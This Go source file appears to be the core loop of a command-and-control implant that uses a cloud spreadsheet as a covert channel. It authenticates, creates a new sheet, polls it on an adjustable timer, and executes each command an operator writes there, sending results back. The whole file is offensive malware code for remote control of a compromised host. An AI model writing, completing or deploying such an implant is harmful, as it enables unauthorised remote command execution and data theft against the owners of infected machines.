package C2

import (
	"fmt"
	"time"
)

func Run(c2 *Client) {

	// perform authentication
	c2.Authenticate()

	// new sheet meta
	newSheetName := c2.GenerateNewSheetName()
	c2.SheetName = newSheetName
	c2.Ticker = 30
	c2.TickerCell = "D1"
	c2.AddSheet(newSheetName)

	// Timeer for cmd loop
	tick := time.NewTicker(time.Duration(c2.Ticker) * time.Second)

	for {
		select {
		case <-tick.C:
			go func() {

				// * Use /usedRange API to get all the used cells
				new_ticker, new_cmds, err := c2.GetCommandsFromSheet(c2.SheetName)
				if err != nil {
					c2.LogDebug("Failed to get range from sheet : " + err.Error())
				}

				// * Check for the ticker value and update it if changed
				if c2.Ticker != new_ticker {
					c2.LogDebug("New ticker found - " + fmt.Sprintf("%v", new_ticker))
					c2.Ticker = new_ticker
					tick.Reset(time.Duration(c2.Ticker) * time.Second)
				}

				// Create commands and execute them if the output isn't set in the sheet
				if len(new_cmds) == 0 {
					c2.LogDebug("No new commands")
				}
				for _, cmd := range new_cmds {
					cmd.ExecuteAndUpdate(*c2)
				}
			}()
		}
	}

}
